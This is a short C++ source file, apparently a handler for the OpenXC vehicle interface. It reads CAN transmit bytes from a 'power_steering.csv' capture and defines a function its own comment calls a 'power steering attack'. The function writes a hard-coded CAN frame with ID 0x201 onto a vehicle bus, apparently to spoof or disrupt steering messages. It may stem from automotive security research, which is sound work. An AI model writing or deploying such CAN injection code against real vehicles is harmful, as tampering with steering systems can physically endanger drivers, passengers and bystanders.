//Contains handlers for translations in commmand library.

namespace can = openxc::can; 
using openxc::can::lookupSignal;

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <stdlib.h>

//reads in Hex values (CAN transmit bytes) as ints
std::vector<std::vector<int> > readCSV() {

   std::vector<std::vector<int> > array;
   std::ifstream file( "power_steering.csv" );
   std::string line; 

   if (!file.is_open())
   {
      return array;
   }

   for (int i = 1; i < 98; i++){
      std::getline(file, line); // skip the first 97 lines
   }

   while( std::getline( file, line ) ) {

      std::istringstream iss( line );
      std::string result;

      std::vector<int> a2;
      while( std::getline( iss, result, ',' ) ) {
         a2.push_back(strtoul( result.c_str(), NULL, 16 ));
      }

      array.push_back(a2);
   }

   return array;
}

//reads in CAN Bus (MS or HS) as string
std::vector<std::vector<std::string> > readCSV2() {

   std::vector<std::vector<std::string> > array;
   std::ifstream file( "power_steering.csv" );
   std::string line; 

   if (!file.is_open())
   {
      return array;
   }

   for (int i = 1; i < 98; i++){
      std::getline(file, line); // skip the first 97 lines
   }

   while( std::getline( file, line ) ) {

      std::istringstream iss( line );
      std::string result;

      std::vector<std::string> a2;
      while( std::getline( iss, result, ',' ) ) {
         a2.push_back(result);
      }

      array.push_back(a2);
   }

   return array;
}

//Handler to conduct power steering attack
void powerSteeringHandler(const char* name, openxc_DynamicField* value,
	openxc_DynamicField* event, CanSignal* signals, int signalCount) {

	CanMessage can_message = {0};
	CanBus* bus = openxc::can::lookupBus(1, openxc::signals::getCanBuses(), openxc::signals::getCanBusCount());
	//const bool attack = value->boolean_value;

	//std::vector<std::vector<int> > array = readCSV(); //Arbitration ID in column 9, Transmit Bytes in columns 12-19
	//std::vector<std::vector<std::string> > array2 = readCSV2(); //CAN Bus column 7
	can_message = {0x201, STANDARD, {0x2B, 0x88, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}, 8};

	can::write::sendCanMessage(bus, &can_message);
	//can::write::enqueueMessage(bus, &can_message);
	//can::write::flushOutgoingCanMessageQueue(bus);

}
